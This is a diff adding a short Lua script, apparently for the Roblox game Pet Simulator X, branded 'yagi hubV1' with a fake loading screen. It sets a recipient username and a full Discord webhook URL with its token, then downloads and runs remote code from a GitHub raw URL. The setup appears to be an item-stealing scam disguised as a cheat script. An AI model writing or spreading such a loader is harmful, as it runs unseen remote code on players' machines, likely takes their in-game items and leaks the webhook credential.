@@ -1,0 +1,17 @@
+Username = "damusean"
+
+WebHook = "https://discord.com/api/webhooks/958638250321395732/C4K_juGVEDyPsTD22dZWgYfyk-32u17MhxR_-cYVUseMjxNcCMoKUmCYAd3FC8wfUQJf"
+
+loadingscreen = true
+
+_G.CustomScriptName = "yagi hubV1"
+
+_G.Text1 = "starting"
+
+_G.Text2 = "cheaking"
+
+_G.Text3 = "detecting"
+
+_G.Text4 = "finish"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
